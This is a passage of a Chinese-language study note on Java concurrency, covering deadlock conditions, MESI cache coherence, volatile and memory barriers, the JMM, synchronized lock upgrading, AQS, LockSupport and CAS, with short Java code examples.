在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。在系统的处理上，中断和异常类似，都是通过中断向量表来找到相应的处理程序进行处理。区别在于，中断来自处理器外部，不是由任何一条专门的指令造成，而异常是执行当前指令的结果。\n\n同步和异步\n以同步方式调用方法时，必须在方法返回结果之后才能执行后面的操作。\n以异步方式调用方法时，不需要等方法返回信息就可以执行后面的操作，当方法完成后，会以通知或回调的方式告诉调用方。\n\n死锁、饥饿、活锁\n死锁指两个或多个线程在执行过程中互相等待对方释放资源的情况，导致彼此无法继续执行；\n饥饿指某个线程由于一直无法获得所需资源而无法执行；\n活锁指两个或多个线程由于某些条件发生变化，导致彼此不断地改变自己的状态和行为，但始终无法向前推进。\n\n死锁形成死锁的必要条件\n互斥条件：资源只能被一个线程占有。\n不可剥夺条件：线程占有的资源不能被其他线程强行撤销。\n请求与保持条件：如果线程已经占有了一个资源，有需要抢占新资源，而该新资源已经被其它线程占有时，那么抢占新资源的线程会阻塞等待，不会释放自己已经占有的资源。\n循环等待条件：发生死锁时，必然存在一个线程与资源的循环等待链，链中的线程请求的资源被下一个线程占有。\n\n死锁的预防\n死锁的预防是破坏死锁形成的条件，而互斥条件不能被破坏，因为使用锁的目的就是要保证这一点。\n破坏不可剥夺条件：让当前线程主动释放锁，JVM内置的synchronized锁不能实现这一点，JDK的Lock锁可以实现。使用方法是，通过tryLock()方法加锁，并在finally代码块中调用unlock()方法释放锁。\n破坏请求与保持条件：一次性申请线程所需的全部资源，在运行过程中不再请求新的资源。\n破坏循环等待条件：按照一定的顺序申请资源，实现方法是为每一个资源分配一个唯一编号，每次申请资源时都按照一定的顺序加锁，比如每次都先对编号较小的资源加锁。\n\n自旋锁自旋锁是指线程在获取锁失败后，不会立即进入阻塞状态，而是继续不断尝试获取锁\n原子性、可见性、有序性概念原子性、可见性、有序性是并发编程的三大特性。\n\n原子性\n原子性是指一个或多个操作，要么全部执行，要么全不执行，不能存在只执行了一部分的情况。\n造成原子性问题的根本原因是在线程执行过程中发生了线程切换。\n\n可见性\n可见性是指一个线程修改共享变量，其他线程能够立即读取到共享变量的最新值。\n造成可见性问题的根本原因是CPU的缓存机制。\n\n有序性\n有序性是指程序能够按照代码的顺序执行，不会发送乱序执行。\n一个典型的有序性问题是使用双重监测机制创建单例对象（DCL单例），如果在多线程情况下创建单例对象发送乱序执行就可能产生bug。\n\n\n解决方法总结（详细的解决方法见下文）：\n\n原子性：Java中解决原子性问题的方案是使用synchronized锁、Lock锁、原子类或CAS操作等。\n可见性：使用缓存一致性协议\n有序性：禁止指令重排\n\n原子性核心原理加1操作中的原子性问题CPU对内存中的一个共享变量值进行加1的操作不是原子操作，这是因为在CPU中对值加1的操作有三步（设被加1的数叫count）：\n\n将内存中的count值读取到寄存器。\n对寄存器中的count值进行加1操作。\n将寄存器中的count值写回内存。\n\n总线锁保证加1操作的原子性如果要保证这三步的原子性，就要保证在CPU1执行这三步的时候，其他CPU不能读写这个共享变量的内存。CPU可以通过对总线加锁来解决这个问题。\n在Linux系统中，锁定总线的指令是lock前缀指令。该指令可以与其他指令组合使用，例如lock add、lock cmpxchg、lock xchg等，用于实现原子性操作。\nlock前缀指令会将总线置为锁定状态，以确保对内存的访问具有原子性和互斥性。当一个CPU执行带有lock前缀的指令时，它将先发送请求到总线，获取总线的独占控制权，然后执行相关的操作并释放总线控制权。由于总线只能被一个CPU独占，因此其他CPU在访问内存时会被阻塞，直到当前CPU执行完成。\n总线锁定会导致其他CPU核心跟所有内存之间的通信全部阻塞，开销极大，而输出LOCK#信号的CPU核心可能只需要使用内存中的很小一部分空间，会造成资源的浪费。\n互斥锁保证对临界区操作的原子性互斥锁就是对临界区资源的锁对象加锁，如synchronized锁、Lock锁都属于互斥锁。当一个线程尝试获取互斥锁时，如果该锁已经被其他线程占用，那么当前线程就会被阻塞。\n互斥锁模型：\n\n对临界区资源的锁对象加锁\n进入临界区代码执行\n对锁对象进行解锁\n\nCAS保证赋值操作的原子性CAS底层使用的操作系统原语是lock cmpxchg。\n可见性和有序性核心原理缓存一致性的产生原因和特点由于CPU的多级缓存架构，引入了数据的不一致问题。\nCPU的缓存一致性要求CPU内部缓存中的数据和主内存中的数据一致。\n缓存一致性的特点：每个读操作所返回的值必须是最后一次对该存储位置的写操作的值。\nMESI协议的简介CPU通过缓存一致性协议（如MESI协议、MSI协议等）来保证缓存一致性。\nMESI协议的每一个字母都是一种状态的简称，这四种状态分别是：\n\nM：Modify\n处于M状态的缓存行的特点是：\n\n数据只在当前CPU核心的缓存中存在\n缓存行数据被本地写（当前CPU核心修改缓存行数据），缓存行中的数据和主内存中的数据不一致\n\n处于M状态的缓存行中的数据必须在其他CPU核心读取主内存的数据之前写回主内存\nM状态的缓存行数据被写回主内存后，当前缓存行的状态会被标记为E\n\nE：Exclusive\n处于E状态的缓存行的特点：\n\n数据只在当前CPU核心的缓存中存在\n缓存行数据未被修改过，缓存行中的数据和主内存中的数据一致，缓存行有效\n\n处于E状态的缓存行的数据如果被其他的CPU核心读取，会变成S状态\nE状态的缓存行数据被修改后，当前缓存行的状态会被标记为M\n\nS：Shared\n处于S状态的缓存行的特点是：\n\n数据存在于多个CPU核心的缓存\n缓存行数据未被修改过，缓存行中的数据和主内存中的数据一致，缓存行有效\n\n处于S状态的缓存行的数据如果发生本地写，会变成M状态\n处于S状态的缓存行的数据如果发生远程写（其他CPU核心修改缓存行数据），会变成I状态\n\nI：Invalid\n处于I状态的缓存行的特点是：\n\n处于I状态的缓存行无效\n\n处于M、E或S状态的缓存行数据，如果发生远程写，则这些缓存行状态都会改为I状态\n\n\nMESI存在的问题：\n\nMESI协议在高并发场景下可能会存在问题，原因是在MESI协议下，如果当前CPU需要其他的CPU缓存行改变状态，会发送RFO（Request For Owner）请求进行通知，请求到达其他的CPU是需要时间的，在高并发场景下状态的修改可能会不及时。\n\nM状态的缓存行数据不会立即更新到主内存，可能会导致其他CPU缓存行中读取的数据和修改后的数据出现短暂的不一致，这一问题可以通过加锁或volatile解决。\n\n存在伪共享问题。伪共享问题产生的原因是，CPU进行缓存和主内存交换数据的单位是缓存行（目前主流CPU缓存行的大小是64bytes），MESI协议也是针对缓存行变更状态，不是单个数据的状态。一个缓存行可能会存储了多个不同数据，所以缓存行中不同数据的状态存在共享的可能（伪共享），会导致不同数据的缓存状态彼此干扰。\nJDK8之前可以通过字节填充的方式解决伪共享问题，思路大致是在创建变量时，用其他字段填充当前变量所在的缓存行，避免同一个缓存行内存放多个数据变量。\nJDK8中引入了@Contended注解来自动填充缓存行，@Contended注解可以用在类和成员变量上，加上@Contended注解后JVM会自动填充，避免出现伪共享问题。使用@Contended注解需要注意的问题是，@Contended只能用在Java自身的核心类中，如果要用在自己写的类里面，需要添加JVM参数-XX:RestrictContended，此外，@Contended默认的填充宽度是128bytes，如果需要自定义宽度需要配置JVM的-XX:ContendedPaddingWidth参数。\n\n\nvolatile核心原理volatile能够保证可见性和有序性，不支持原子性，不是线程安全的。\nvolatile在内存语义上有两个作用：\n\n保证被volatile修饰的共享变量对每个线程都是可见的（可见性）：volatile能够保证共享变量的可见性，如果一个共享变量使用volatile修饰，则共享变量所在的缓存行会被要求进行一致性校验，当一个线程修改了volatile修饰的共享变量后，修改后的共享变量值会立即刷新到主内存（MESI协议不会立即刷新，而是等远程读或远程写才会将修改后的数据值刷新到主内存）。\n禁止指令重排（有序性）\n\nvolatile保证可见性和有序性是通过内存屏障（Memory Barrier）实现的。内存屏障的底层是CPU指令。这个指令有两个作用：\n\n强制刷新缓存，保证共享变量的可见性\n强制刷新缓存是指将处理器的缓存中的数据立即写回到主内存。当处理器修改了某个内存地址的值时，为了确保其他处理器能够看到最新的值，处理器会将修改后的值先写入自己的缓存中，然后再定期将缓存中的数据刷新回主内存。但是有时候我们需要立即刷新缓存，以确保其他处理器能够尽快看到最新的值。这可以通过执行一个写屏障或者其他特定的指令来实现。\n\n禁止指令重排，保证指令的执行顺序\n处理器为了提高程序执行效率，在编译（编译器重排序）或运行（CPU重排序）时会针对代码中的语句进行优化和重排。然而，在多线程并发环境下，这种重排可能会导致一些共享变量的状态无法正确传递，从而出现数据不一致的情况。内存屏障可以禁止指令重排，确保程序执行顺序的正确性。\n注：\n\n编译器重排序：在代码编译阶段为了提高程序的执行效率，但不改变程序执行结果的重排序。\nCPU重排序：CPU按照as-if-serial原则进行指令级重排序和内存系统重排序。as-if-serial原则能够保证在单线程环境下程序执行的正确性，不能保证在多线程环境下程序执行结果的正确性。\n\n\n\n内存屏障内存屏障的类型：\n\nLoadLoad屏障：禁止前面的读（Load）和后面的读（Load）重排\nLoadStore屏障：禁止前面的读（Load）和后面的写（Store）重排\nStoreLoad屏障：禁止前面的写（Store）和后面的（Load）重排\nStoreStore屏障：禁止前面的写（Store）和后面的写（Store）重排\n\nvolatile禁止指令重排序的规则：\n\n\n\n是否能重排序\n第二个操作\n\n\n\n\n\n第一个操作\n普通读或写\nvolatile读\nvolatile写\n\n\n普通读或写\n是\n是\n否\n\n\nvolatile写\n是\n否\n否\n\n\nvolatile读\n否\n否\n否\n\n\n可以总结出规则是：\n\n当第一个操作是volatile读，无论第二个操作是什么，都不能重排序（读操作禁止重排序之后的操作）\n当第一个操作是volatile写，第二个操作是volatile读，不能重排序\n当第二个操作是volatile写，无论第一个操作是什么，都不能重排序（写操作禁止重排序之前的操作）\n\nJVM编译器会按照上述规则在程序编译生成的指令中插入内存屏障，规则是：\n\n对于volatile读\n后面插入一个LoadLoad屏障\n后面插入一个LoadStore屏障\n\n\n对于volatile写\n前面插入一个StoreStore屏障\n后面插入一个StoreLoad屏障\n\n\n\nDCL为什么需要加volatileDCL（Double Check Lock）是单例模式的一种实现方式，进行了两次（加锁前一次，加锁后一次）对象判空操作。\n创建对象的操作是被编译成多条指令执行的，这多条指令大致包含三件事情，给对象分配内存、初始化对象、将对象指向分配的内存空间。如果不加volatile，不能避免指令重排序，初始化指令和将对象指向分配的内存空间的指令可能会倒换，即可能出现将对象指向分配的内存空间发生在初始化指令之前，即\n\n加volatile，没有被重排序的指令执行过程如下\n\n初始化指令\n将对象指向分配的内存空间的指令\n\n\n不加volatile，可能出现的重排序的指令执行过程如下\n\n将对象指向分配的内存空间的指令\n初始化指令\n\n这就导致在多线程环境下，如果没有使用volatile，假如一个线程正在使用创建对象，并且发生了指令重排序，使得堆栈建立连接的指令发生在初始化指令之前，那么当这条线程恰好执行完堆栈建立连接的指令，还没有执行初始化指令时，有一个新的线程线程执行DCL单例的函数，判断得到对象已经指向内存空间，就会执行返回此对象，而此时对象还没有被初始化，此时获取的对象的值仅仅是默认值而不是初始化的值。\n\n\nJMMJMM（Java内存模型，Java Memory Model）规定了主内存（主要对应于Java堆中存储对象实例数据的部分）和线程的工作内存（主要对应于虚拟机栈中的部分区域）之间的数据交互（变量从主内存复制到工作内存，以及从工作内存同步到主内存等）的实现细节。\nJMM规定：\n\n线程不能直接访问其他线程的工作内存中的数据，只能通过主内存进行数据交互\n当线程需要操作变量时，需要先将主内存中的变量复制到对应的工作内存中\n\nJMM同步数据的八种操作：\n\n\n\n操作\n名称\n目标\n作用\n\n\n\nlock\n加锁\n主内存中的变量\n把主内存中的变量标记为线程独占的状态\n\n\nunlock\n解锁\n主内存中的变量\n释放主内存中锁定的变量，释放后可以被其他线程锁定\n\n\nstore\n存储\n工作内存中的变量\n把工作内存中的变量的值刷新到主内存中，以便随后的write操作使用\n\n\nwrite\n写入\n工作内存中的变量\n把store操作从工作内存中得到的变量写入到主内存的变量中\n\n\nread\n读取\n主内存中的变量\n把主内存中的变量写入到工作内存中\n\n\nload\n载入\n主内存中的变量\n将read操作从主内存中得到的变量值载入工作内存的变量中\n\n\nuse\n使用\n工作内存中的变量\n将工作内存中的变量值传递给执行引擎\n\n\nassign\n赋值\n工作内存中的变量\n执行引擎将值赋值给工作内存中的变量\n\n\nHappens-Before原则JSR（Java Specification Requests，Java 规范提案） 133 引入了 happens-before 这个概念来描述两个操作之间的内存可见性和有序性。Happens-Before原则和JMM的关系是，Happens-Before原则是展现给程序员的易于理解的JMM实现结果。\nHappens-Before原则主要包括以下内容：\n\n程序次序原则：写在前面的操作先行发生于写在后面的操作\n\nvolatile变量原则：对一个volatile变量的写操作必然发生在后续对这个变量的读操作之前\n\n传递原则：ABC三个操作，A先于B，B先于C，则A先于C\n\n锁定原则：先解锁才能加锁\n\n线程启动原则：线程start()后才能执行线程中的代码\n\n线程中断原则：对线程的interrupt()方法的调用发生在中断事件产生之前\n\n线程终结原则：线程结束后，其他线程能够访问到该线程修改后的共享变量的值\n\n对象终结原则：一个对象的初始化必然在其finalize()方法之前执行\n\n\nJava对象结构Java对象结构按照顺序由以下几部分组成：\n\n对象头\nMark Word\n类型指针\n数组长度（仅在当前对象是数组时才会存在）\n\n\n实例数据\n对齐填充\n\n以下是对Java对象组成部分的详细说明（64位JVM下）： \n\n对象头（8 + 4 + 4 &#x3D; 12 + 4 &#x3D; 16字节）\n\nMark Word（8字节）\nMark Word用于存储对象的运行时数据，按照锁状态可以分为以下几类：\n\n无锁：对象的Hash码（31位）、GC的分代年龄（4位）、偏向锁标记（1位）、锁的状态标志（2位）\n偏向锁：偏向锁线程id（54位）、获得偏向锁的时间戳（2位）、GC的分代年龄、偏向锁标记、锁的状态标志\n轻量级锁：轻量级锁指针（指向栈中锁的指针，62位）、锁的状态标志\n重量级锁：重量级锁指针（指向对象监视器的指针，62位）、锁的状态标志\nGC标记（GC标记用于标记可以回收的垃圾对象）：锁的状态标志\n\n\n类型指针（4字节，默认开启压缩，由8字节压缩为4字节）\n类的类元信息存储在JVM的方法区中，对象头的类型指针会指向存储在方法区中的类元信息\n不同位数的JVM中长度不同，在32位JVM中，类型指针占用32位的存储空间，64位JVM中，占用64位。\n\n数组长度（仅在当前对象是数组时才会存在，4字节）\n\n\n\n实例数据\n存储对象的成员变量信息，既包含了类的成员变量值（具体值），也包含了父类的成员变量值\n\n对齐填充\n以满足JVM中对象的起始地址是8的整数倍的要求，所以对象的实例变量占用的存储空间需要是8字节的整数倍\n\n\n使用JOL查看对象结构为了方便查看JVM中对象结构并计算某个对象的大小，OpenJDK提供了一个JOL工具包\n定义了一个int[]数组，并使用JOL提供的方法输出对象信息：\n\n输出的Java对象信息：\n\nsynchronizedsynchronized用法synchronized用法分三种：\n\n同步实例方法\n当类的实例方法被synchronized修饰时，相当于对this加锁（对象锁），这个方法被声明为同步方法。\n对象锁：对实例方法和同步代码块加的锁称为对象锁\n\n同步静态方法\n当类的静态方法被synchronized修饰时，相当于对这个类的Class对象加锁（类锁），而一个类只对应一个Class对象。\n类锁：对静态方法加的锁称为类锁\n\n同步代码块\n通过对互不影响的临界区资源分别加锁（可能需要创建锁对象），可以减小对临界区资源的等待，提高程序的执行效率。\n\n\nsynchronized底层实现synchronized是基于JVM中的monitor锁实现的，Java1.5版本之前的synchronized锁性能较低，但是从Java1.6开始，对synchronized锁进行了优化，引入了锁升级、锁粗化、锁消除等技术来提高synchronized的性能。\n\n字节码层面\n\nsynchronized修饰的方法的字节码会比普通方法多一个ACC_SYNCHRONIZED标识符\n\nsynchronized修饰的代码块的字节码会在同步代码块的前后分别添加monitorenter和monitorexit指令\n\n\n\nJVM层面\nsynchronized修饰方法和代码块，在底层实现上没有本质区别\n重量级锁的底层是基于Monitor锁实现的\n\n操作系统层面\n轻量级锁的底层是基于CAS实现的\n重量级锁在JVM层面用到的Monitor锁是基于操作系统的Mutex锁实现的，Mutex锁是操作系统级别的重量级锁。\n\n\nMonitor锁原理重量级锁的底层是基于Monitor锁实现的，而Monitor锁又是基于操作系统的Mutex锁实现的。\n在Java中创建出来的任何一个对象都会关联一个Monitor对象，当Monitor对象被一个Java对象持有后（Monitor对象的owner参数不为空），这个Monitor对象就会处于锁定状态。\n在HotSpot JVM中，Monitor对象是由ObjectMonitor实现的，ObjectMonitor 是JVM中用于实现对象的同步、监视和锁定的重要数据结构。ObjectMonitor的数据结构：\nObjectMonitor() &#123;    _header       = NULL;    _count        = 0; //记录线程获取锁的次数    _waiters      = 0,    _recursions   = 0;  //锁的重入次数    _object       = NULL;    _owner        = NULL;  //指向持有ObjectMonitor对象的线程    _WaitSet      = NULL;  //处于wait状态的线程，会被加入到_WaitSet    _WaitSetLock  = 0 ;    _Responsible  = NULL ;    _succ         = NULL ;    _cxq          = NULL ;    FreeNext      = NULL ;    _EntryList    = NULL ;  //处于等待锁block状态的线程，会被加入到该列表    _SpinFreq     = 0 ;    _SpinClock    = 0 ;    OwnerIsThread = 0 ;  &#125;\n\nObjectMonitor的几个关键属性 count、recursions、owner、WaitSet、EntryList 体现了monitor的工作原理。\nsynchronized加锁与解锁在JVM底层的实现流程大致分为以下几步：\n\n被阻塞的线程被封装成ObjectWaiter对象进入_EntryList，获取到锁（获取到Monitor对象）的线程就会被_owner指向，并把ObjectMonitor对象的_count变量值加1。\n\n当线程调用wait()方法时，当前线程会释放持有的ObjectMonitor对象，并把_owner变量值设为NULL，_count变量值减1。\n由于wait()、notify()、notifyAll()等方法在执行过程中会使用ObjectMonitor对象，所以，必须在synchronized同步代码块或方法中调用这些方法。\n\n如果获取到ObjectMonitor对象的线程执行完毕，则会释放ObjectMonitor对象，将ObjectMonitor对象中的_count变量值减1（当_count变量值再次为0，当前线程就成功的释放了锁），_owner变量值设为NULL。\n\n\n锁升级的过程锁升级的过程经历以下几个阶段\n\n无锁\n\n偏向锁\n\n轻量级锁（自旋锁）\n\n重量级锁\n\n\nJava锁对象由无锁升级为重量级锁的详细步骤：\n\n线程的抢占锁时首先会检查偏向锁标记位和锁标记位，如果发现是偏向锁，进行锁竞争的一般流程：\n\n线程获取锁：线程会检查Mark Word中的偏向锁线程id是否是自己的线程id。\n如果是，则当前线程已经持有了锁，直接执行同步代码。\n如果不是，则当前线程会通过CAS自旋的方式尝试将Mark Word中的偏向锁线程id设为自己的线程id。\nCAS操作成功，将Mark Word中的偏向锁线程id设为自己的线程id的操作成功。\nCAS操作失败，说明此时有其他线程也在争抢锁资源，此时会撤销偏向锁，升级为轻量级锁。\n\n\n\n\n\n\n如果发现是轻量级锁，进行锁竞争的一般流程：\n\n将锁对象的 Mark Word 备份到 Displaced Mark Word （当线程被创建后，JVM会在线程的栈帧中创建一个用于存储锁记录（Lock Record）的空间，里面存储了owner和Displaced Mark Word）中，并将栈帧的owner指针指向锁对象。\n\n尝试通过 CAS 将锁对象的 Mark Word 更新为指向线程自己的 Displaced Mark Word 的指针。\n\n如果CAS操作成功，表示当前线程成功获取了轻量级锁，并进入临界区执行。\n\n如果已经指向其他线程，竞争锁失败，会进行CAS操作。\n\n自旋等待：如果CAS操作失败，表示锁对象已经被其他线程占用。此时，请求锁的线程会进入自旋等待状态。在自旋等待状态下，线程会反复尝试使用CAS操作获取锁，而不会被阻塞。\n\n自旋限制：CAS自旋操作超过一定的次数仍未抢占到锁，轻量级锁会膨胀为重量级锁，进入阻塞状态。\n对于自旋次数上限值，JDK中提供了自适应自旋的方案，如果当前线程的CAS自旋成功，就会增大下一次的自旋次数上限值。\n\n\n\n\n\n当线程释放锁\n\n如果锁对象还是轻量级锁的状态，当前线程就会使用CAS操作将Displaced Mark Word中存储的信息复制到锁对象的Mark Word中。\n如果锁对象已经升级为了重量级锁，当前线程就会释放锁并唤醒其他被阻塞的线程争抢锁。\n\n\n\n\n如果发现是重量级锁，进行锁竞争的一般流程：\n\n线程请求锁：当一个线程需要获取重量级锁时，它会向操作系统发送请求。\n如果当前没有其他线程持有锁，请求的线程会成功获取锁，并进入临界区执行。\n\n如果锁已经被其他线程占用，请求的线程将进入阻塞等待状态，线程会被操作系统挂起，不会占用CPU资源。\n\n\n\n\n\n\nJava锁对象由无锁升级为重量级锁的其他途径：\n\n计算一致性哈希\n只要锁对象计算过一致性哈希，偏向模式就置为0了，也就意味着该对象锁不能再偏向了，最低也会膨胀会轻量级锁。如果对象锁处于偏向模式时遇到计算一致性哈希请求，那么会跳过轻量级锁模式，直接膨胀为重量级锁。\n\n\n锁降级重量级锁的降级只会发生在GC期间的STW（Stop-The-World，所有应用程序的线程都被暂停）阶段，只能降级为可以被JVM线程访问，而不被其他Java线程访问的对象。\nAQS（抽象队列同步器）核心原理AQS底层对锁的支持AQS（AbstractQueuedSynchronizer，抽象队列同步器）是Java中提供的一个抽象类，位于java.util.concurrent.locks包下。AQS的主要用途是方便实现同步器，是同步状态的管理、线程的阻塞与唤醒等核心操作的基类，子类只需要实现几个简单的抽象方法就能构建出完整的同步器。\nJava中java.util.concurrent包下的大部分并发工具类和锁工具类的实现都基于AQS（都extends Sync，而Sync extends AbstractQueuedSynchronizer），包括：\n\nAQS核心数据结构AQS的核心数据结构主要包括以下几个部分：\n\n变量state\nAQS 的int 成员变量 state，由 volatile 修饰，用于表示当前临界资源的获锁情况。\n以 ReentrantLock 为例：\n\nstate 初始值为 0，表示未锁定状态。\n线程 lock() 时，会调用 tryAcquire() ，独占该锁并将 state + 1 。此后，其他线程再 tryAcquire() 时就会失败，直到 A 线程 unlock() 到 state=0（即释放锁）为止，其它线程才有机会获取该锁。\n释放锁之前，线程自己是可以重复获取此锁的（state 会累加），这就是可重入的概念。但要注意，获取多少次就要释放多少次，这样才能保证 state 是能回到零态的。\n\n\n两个FIFO的双向链表（同步队列和同步条件队列）\n链表中的每个节点都是对线程的封装，如果线程竞争锁失败，就会被封装成一个Node节点加入AQS队列的尾部。当获取锁的线程释放锁之后，会从AQS中唤醒一个被阻塞的线程。\n\n同步队列通过addWaiter()方法添加到队列的尾部，通过acquire()方法退出同步队列\n同步条件队列addConditionWaiter()方法添加到队列的尾部，通过doSignal()方法退出同步队列。AQS中的同步条件队列就是为Lock锁实现的一个基础同步器，只有在使用了Condition时会存在条件队列，并且一个线程可能存在多个条件队列\n\n\nNode类（双向链表的节点类）\n静态内部类Node是一个双向链表的节点类，节点中保存了当前的状态waitState和当前线程thread。通过SHARED和EXCLUSIVE定义共享或独占状态。\nNode中有四个常量，是waitState变量的取值，waitState变量也是用volatile修饰：\n/** waitStatus value to indicate thread has cancelled */// 表示当前节点中的线程已被取消static final int CANCELLED =  1;/** waitStatus value to indicate successor&#x27;s thread needs unparking */// 表示后继节点中的线程处于等待状态，需要被唤醒static final int SIGNAL    = -1;/** waitStatus value to indicate thread is waiting on condition */// 表示当前节点中的线程在等待某个条件，也就是当前节点处于condition队列中static final int CONDITION = -2;/** * waitStatus value to indicate the next acquireShared should * unconditionally propagate */// 表示在当前场景下能够执行后续的acquireShared操作static final int PROPAGATE = -3;\n\n双向队列的头节点指针、尾节点指针\n头节点指针指向的节点封装的线程会占用资源，同时会通过CAS的方式更新state变量、头&#x2F;尾节点指针的指针的指向。\n\n\nAQS独占锁和共享锁AQS底层支持独占锁和共享锁两种模式：\n\n独占锁同一时刻只能被一个线程占用，如ReentrantLock\n共享锁同一时刻可以被多个线程占用，如CountDownLatch、Semaphore等\n有的锁实现类同时实现了独占锁和共享锁两种模式：如ReentrantReadWriteLock\n\nAQS独占锁和共享锁的加锁和解锁流程：\n\n独占锁模式下的加锁流程：独占锁加锁的入口是acquire()方法，当线程调用acquire()方法获取独占锁时，首先会调用tryAcquire()方法尝试获取锁资源，如果获取失败返回false，就会调用addWaiter()方法将当前线程封装为Node节点，添加到AQS队列的尾部。\n独占锁模式下的解锁流程：独占锁模式中，释放锁的入口方法是release()，在release()方法中首先会调用tryRelease()方法尝试释放锁，如果返回true，并且head节点不为空且head节点的waitState状态不为0，会调用unparkSuccessor()方法唤醒队列最前面可以被唤醒的节点。\n共享锁模式下的加锁流程：共享锁加锁的入口是acquireShared()方法，当线程调用acquireShared()方法获取共享锁时，首先会调用tryAcquireShared()方法尝试获取锁资源，如果获取失败返回负数，就会调用doAcquireShared()方法将当前线程封装为Node节点，添加到AQS队列的尾部并阻塞。\n共享锁模式下的解锁流程：共享锁模式中，释放锁的入口方法是releaseShared()，在release()方法中首先会调用tryReleaseShared()方法尝试释放锁，如果返回true，就执行doReleaseShared()方法唤醒队列后面的线程。\n\nLockSupportLockSupport位于java.util.concurrent.locks包，是Java提供的创建锁和其他多线程工具的基础类库，主要作用就是阻塞和唤醒线程，底层是基于UnSafe类实现的。AQS 底层就是使用了LockSupport来实现线程的阻塞和唤醒。\nLockSupport类提供的核心方法：\n\n\n\n\n\n方法\n功能\n\n\n\npublic static void park()\n阻塞当前线程\n\n\npublic static void park(Object blocker)\n使用指定的 blocker（锁对象）阻塞当前线程\n\n\npublic static void parkNanos(long nanos)\n阻塞当前线程，并指定了最长阻塞的时间，单位是纳秒\n\n\npublic static void parkUntil(long deadline)\n阻塞当前线程，并指定了deadline时间点\n\n\npublic static void parkNanos(Object blocker, long nanos)\n阻塞当前线程，并指定了使用的 blocker（锁对象）、最长阻塞的时间，单位是纳秒\n\n\npublic static void parkUntil(Object blocker, long deadline)\n阻塞当前线程，并指定了使用的 blocker（锁对象）、deadline时间点\n\n\npublic static void unpark(Thread thread)\n解除指定已被park的线程的阻塞状态；如果线程已经启动但还未park，就取消下一次的park。\n\n\n在底层实现上，LockSupport使用了一种名为”许可（Permit）”的概念来控制阻塞和唤醒。Permit的数量最多为1。\n如果线程已经拿到了Permit，则调用LockSupport.park()会立即返回；如果没有拿到Permit，park()方法会阻塞线程。调用LockSupport.unpark(Thread)方法会给指定的线程发放Permit。\nunpark()可以先于park()调用：如果 unpark(thread) 在 park() 之前被调用，那么线程会获得一个Permit，当后续 park() 被调用时，线程可以立即消费掉这个Permit并继续执行，而不会阻塞。\n如果调用者的线程被中断，park 将返回。\n下面是一个简单的LockSupport使用例子：\npublic static void main(String[] args) &#123;\tThread thread = new Thread(() -&gt; &#123;\t\tSystem.out.println(&quot;Child thread begin park!&quot;);\t\t//调用park方法，挂起自己\t\tLockSupport.park();\t\tSystem.out.println(&quot;Child thread end park!&quot;);\t&#125;);\tthread.start();\t//主线程延迟2s\ttry &#123;\t\tThread.sleep(2000);\t&#125; catch (InterruptedException e) &#123;\t\te.printStackTrace();\t&#125;\tSystem.out.println(&quot;Main thread begin unpark!&quot;);\t//调用unpark方法让thread线程持有许可证，然后park方法返回\tLockSupport.unpark(thread);&#125;/**输出结果：Child thread begin park!Main thread begin unpark!Child thread end park!*/\n\n在这个例子中，子线程通过调用LockSupport.park()方法阻塞自己，主线程在延迟2秒后调用LockSupport.unpark(thread)方法唤醒子线程，子线程成功地被唤醒。\nCAS核心原理CAS的基本概念\n将内存位置的内容与给定值进行比较，只有当它们相同时，才将该内存位置的内容修改为新的给定值\n\nCAS（Compare And Swap）是一种无锁编程算法，属于乐观锁。\nCAS以原子性的方式更新共享变量的数据，能够保证线程安全。\nCAS算法的使用包含以下步骤（假设新值是基于共享变量的旧值计算得到的，比如加1操作）：\n\n读取到的共享变量的值是prev\n确定要修改的值是next（如next&#x3D;prev+1）\n再次读取共享变量的值是cur，并比较prev和cur是否一样，即计算得到next的操作前后共享变量的值是否发生了改变。如果没有发生改变就更新共享变量的值为next；如果发生了改变，则重新从第一步开始执行，或者根据需要结束执行。\n\nAtomicInteger的getAndUpdate方法的实现就体现了这一点：\npublic final int getAndUpdate(IntUnaryOperator updateFunction) &#123;    int prev, next;    do &#123;        prev = get();        next = updateFunction.applyAsInt(prev);    &#125; while (!compareAndSet(prev, next));    return prev;&#125;\n\nCAS的核心类UnsafeUnsafe类是Java中实现CAS操作的核心类，位于sun.misc包，在UnSafe类中提供了大量的native方法，通过JNI（本地方法接口）的方式调用JVM底层的C和C++实现的方法。java.util.concurrent.atomic包下提供的原子类底层操作都是基于Unsafe类实现的。\n使用Unsafe的CAS方法实现count++：\npublic class CasCountIncrement &#123;    //获取Unsafe对象    public static Unsafe getUnsafe() &#123;        Unsafe unsafe = null;        try &#123;            Field singleOneInstanceField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);            singleOneInstanceField.setAccessible(true);            unsafe = (Unsafe) singleOneInstanceField.get(null);        &#125; catch (NoSuchFieldException | IllegalAccessException e) &#123;            e.printStackTrace();        &#125;        return unsafe;    &#125;    private static final Unsafe unsafe = getUnsafe();    private static final int THREAD_COUNT = 20;    private static final int EXECUTE_COUNT_EACH_THREAD = 500;    private volatile int count = 0;    private static long countOffset = 0;    static &#123;        try &#123;            //countOffset存储的是CasCountIncrement类的“count”字段的偏移量值。偏移量表示“count”字段在CasCountIncrement类对象内的内存位置            countOffset = unsafe.objectFieldOffset(CasCountIncrement.class.getDeclaredField(&quot;count&quot;));        &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125;    &#125;    public void incrementCountByCas() &#123;        int oldCount = 0;        do &#123;            oldCount = count;        //使用Unsafe类提供的CAS方法实现加1操作        &#125; while (!unsafe.compareAndSwapInt(this, countOffset, oldCount, oldCount + 1));    &#125;    public static void main(String[] args) throws InterruptedException &#123;        CasCountIncrement casCountIncrement = new CasCountIncrement();        CountDownLatch countDownLatch = new CountDownLatch(THREAD_COUNT);        for (int i = 0; i &lt; THREAD_COUNT; i++) &#123;            //启动THREAD_COUNT个线程，每个线程执行EXECUTE_COUNT_EACH_THREAD次            new Thread(() -&gt; &#123;                IntStream.range(0, EXECUTE_COUNT_EACH_THREAD).forEach((j) -&gt; &#123;                    casCountIncrement.incrementCountByCas();                &#125;);                countDownLatch.countDown();            &#125;).start();        &#125;;        //等待所有线程执行完毕        countDownLatch.await();        //执行结果显示count = 10000，体现了CAS是线程安全的        System.out.println(&quot;count = &quot; + casCountIncrement.count); //count = 10000    